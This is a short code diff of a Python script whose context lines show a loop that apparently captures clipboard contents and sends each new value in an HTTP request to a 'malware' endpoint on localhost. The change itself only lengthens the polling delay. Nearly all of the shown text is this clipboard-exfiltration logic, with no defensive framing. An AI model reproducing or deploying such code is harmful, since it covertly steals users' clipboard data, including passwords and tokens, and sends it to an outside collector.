@@ -7,5 +7,4 @@ while True:
     if msg not in clist:
         clist.append(msg)
         r = requests.get('http://localhost/malware?clipbord='+ msg)
-
-    time.sleep(5)
+    time.sleep(11)
